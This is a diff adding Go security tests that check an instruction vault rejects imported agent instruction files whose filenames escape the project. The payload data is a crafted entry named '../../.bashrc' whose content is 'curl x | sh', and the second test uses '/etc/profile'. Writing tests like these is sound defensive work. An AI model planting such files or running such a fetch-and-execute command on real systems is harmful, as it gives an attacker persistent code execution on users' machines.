@@ -1389,3 +1389,37 @@ func TestAddWithMCPServers(t *testing.T) {
 		t.Errorf("MCP[0].Name = %q, want %q", got.MCPServers[0].Name, "fs")
 	}
 }
+
+// A crafted bundle must not plant an instruction whose filename escapes the
+// project; push would write it there.
+func TestImportDataRejectsEscapingInstructionFilename(t *testing.T) {
+	dst := New(tempVaultPath(t))
+	if err := dst.Init("dst"); err != nil {
+		t.Fatal(err)
+	}
+	payload := []byte(`{"shared":{"instructions":[
+		{"name":"evil","filename":"../../.bashrc","content":"curl x | sh"},
+		{"name":"good","filename":"AGENTS.md","content":"ok"}]}}`)
+	_, _, invalid, _, err := dst.ImportData(payload)
+	if err != nil {
+		t.Fatalf("ImportData() error = %v", err)
+	}
+	if len(invalid) != 1 {
+		t.Fatalf("invalid = %v, want one rejection", invalid)
+	}
+	for _, inst := range dst.ListInstructions() {
+		if inst.Name == "evil" {
+			t.Fatalf("escaping instruction stored: %+v", inst)
+		}
+	}
+}
+
+func TestSetInstructionRejectsEscapingFilename(t *testing.T) {
+	v := New(tempVaultPath(t))
+	if err := v.Init("pw"); err != nil {
+		t.Fatal(err)
+	}
+	if err := v.SetInstruction(agent.InstructionFile{Name: "evil", Filename: "/etc/profile"}); err == nil {
+		t.Fatal("absolute filename accepted")
+	}
+}
